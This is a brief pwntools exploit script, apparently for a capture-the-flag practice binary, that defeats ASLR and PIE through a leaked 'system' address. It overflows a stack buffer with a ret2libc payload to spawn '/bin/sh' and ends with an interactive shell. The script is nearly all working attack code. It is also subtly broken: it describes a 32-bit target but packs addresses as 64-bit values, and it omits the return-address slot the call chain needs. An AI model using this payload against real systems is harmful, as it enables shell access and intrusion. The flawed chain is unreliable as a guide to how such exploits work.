#!/usr/bin/env python3
# Linux Buffer Overflow 32 bits ASLR, FULL RELRO, NX, PIE with leak


# Checksec

# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

# /proc/sys/kernel/randomize_va_space 2

from pwn import *

elf = context.binary = ELF('./pwn_me')
libc = elf.libc
p = process()

# get the leaked address
p.recvuntil('System is at: ')
system_leak = int(p.recvline(), 16)

# set our libc address according to the leaked address
libc.address = system_leak - libc.sym['system']
log.success('LIBC base: {}'.format(hex(libc.address)))

# get location of /bin/sh from libc
binsh = next(libc.search(b'/bin/sh'))

# payload
payload = b"A"*32 + p64(system_leak) + p64(binsh)
p.sendline(payload)

# Get the shell
p.interactive()
